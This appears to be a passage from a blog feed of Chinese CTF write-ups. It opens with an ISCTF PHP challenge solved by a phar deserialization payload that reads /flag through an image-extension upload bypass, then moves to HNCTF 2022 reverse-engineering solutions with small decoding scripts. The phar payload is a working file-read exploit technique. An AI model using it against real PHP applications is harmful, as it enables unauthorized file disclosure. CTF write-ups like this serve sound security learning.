class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计，发现有个文件包含漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>存在file_exists方法，这个方法可以触发phar反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure><p>生成phar文件，注意phpini中phar.readonly设置为Off，改后缀为jpg</p><p>之后文件读取它，?img_name=phar://upload/phar.jpg</p><p>ISCTF{597a25db-eaa2-473e-9893-a578645f1f818}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> ISCTF </tag>
            
            <tag> wb </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 全方向部分-Writeup</title>
      <link href="/posts/9d7b.html"/>
      <url>/posts/9d7b.html</url>
      
        <content type="html"><![CDATA[<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="超级签到"><a href="#超级签到" class="headerlink" title="超级签到"></a>超级签到</h3><p><img src="https://s2.loli.net/2023/08/04/nE3w1mQdbVBuTFk.png" alt="image-20221012160242556.png"></p><p>逻辑就是输入的Str1和Str2进行比较，flag就是Str2，不过这里当Str2[j] == 111时被替换成Str2[j] == 48。即把o替换成0。</p><p>NSSCTF{hell0_w0rld}</p><h3 id="贝斯是什么乐器啊？"><a href="#贝斯是什么乐器啊？" class="headerlink" title="贝斯是什么乐器啊？"></a>贝斯是什么乐器啊？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">124</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+13Ch] [rbp+BCh]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">    Str[i] -= i;</span><br><span class="line">  base64_encode(Str2, Str);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Str做了个小混淆，然后经过base64加密。那么密文就是enc。</p><p><img src="https://s2.loli.net/2023/08/04/dacXPnpq2b4yuv8.png" alt="image-20221012161359666.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;NRQ@PAu;8j[+(R:2806.i&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">ord</span>(<span class="built_in">str</span>[i]) + i</span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{B@se64_HAHAHA}</p><h3 id="X0r"><a href="#X0r" class="headerlink" title="X0r"></a>X0r</h3><h3 id="给阿姨倒一杯Jvav"><a href="#给阿姨倒一杯Jvav" class="headerlink" title="给阿姨倒一杯Jvav"></a>给阿姨倒一杯Jvav</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reverse</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="type">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">32</span>;</span><br><span class="line">            Resultlist.add(result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] KEY = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; ++j) &#123;</span><br><span class="line">            KEYList.add(KEY[j]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>java逆向，拖到ij里面。flag被Encrypt加密了，加密逻辑就是flag的每一位加上64^32。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] - <span class="number">64</span> ^ <span class="number">32</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{This_is_the_flag_!}</p><h3 id="你知道什么是Py嘛？"><a href="#你知道什么是Py嘛？" class="headerlink" title="你知道什么是Py嘛？"></a>你知道什么是Py嘛？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;please input your flag:&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(s)!=<span class="number">35</span>  <span class="keyword">or</span> s[<span class="number">0</span>]!=<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(s[i-<span class="number">1</span>])^<span class="built_in">ord</span>(s[i])!=arr[i-<span class="number">1</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br></pre></td></tr></table></figure><p>python逆向。这题直接给源码了。要求ord(s[i-1])^ord(s[i])!=arr[i-1]，已知s[0] = ‘N’。那么就能递推后面的s[i]了：s[i+1] = arr[i]^s[i]。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line">s = &#123;&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(arr)):</span><br><span class="line">    s[<span class="number">0</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">    s[i+<span class="number">1</span>] = arr[i]^s[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Pyth0n_1s_th3_best_l@nguage</p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>不怎么会od，官方wp。</p><p>找出CreakMe的Serial</p><p>要学习使用Olldbg的使用</p><p><a href="https://bbs.pediy.com/thread-271168.htm">[原创]《使用 OD 从零开始 Cracking》学习笔记-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p>通过OD中的字符串查找插件找到判断正确或错误的字符串位置</p><p>使用F2 设置断点 然后F9运行</p><p>在内存中找到了明文比较的serial 取出来即可</p><p>注意这个172….是错误的 需要在内存中找到真正的字符串</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="Little-Endian"><a href="#Little-Endian" class="headerlink" title="Little Endian"></a>Little Endian</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v6 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v6 != (enc[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data3rr0r!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enc里面就是密文了，逻辑就是v6和enc[i]^0x12345678比较，每次v6都会自增4（没软用）。要注意的是<em>(_DWORD </em>)v6是大端序，但是数据在内存中都是小端序，所以要将其反转一下。一般在CPU，x86都是小端序，但是IDA会将之转换为了大端序。python不怎么熟，就直接暴力切片了。</p><p><img src="https://s2.loli.net/2023/08/04/oN9ybAe3Mz5digR.png" alt="image-20221020102007833.png"></p><p><img src="https://s2.loli.net/2023/08/04/kGTB3Njb4HlCAYh.png" alt="image-20221012173123111.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = [<span class="number">0x51670536</span>, <span class="number">0x5E4F102C</span>, <span class="number">0x7E402211</span>, <span class="number">0x7C71094B</span>, <span class="number">0x7C553F1C</span>, <span class="number">0x6F5A3816</span>]</span><br><span class="line">dex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag = enc[i]^<span class="number">0x12345678</span></span><br><span class="line">    dex = dex +<span class="built_in">hex</span>(flag)[<span class="number">8</span>:<span class="number">10</span>]+<span class="built_in">hex</span>(flag)[<span class="number">6</span>:<span class="number">8</span>]+<span class="built_in">hex</span>(flag)[<span class="number">4</span>:<span class="number">6</span>]+<span class="built_in">hex</span>(flag)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b16decode(dex.upper()))</span><br></pre></td></tr></table></figure><p>NSSCTF{Littl3_Endiannnn}</p><h3 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h3><p>jeb反编译，看核心代码，jav代码审计。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.crackme;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_register;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_sn;</span><br><span class="line">    String edit_userName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSN</span><span class="params">(String arg11, String arg12)</span> &#123;</span><br><span class="line">        <span 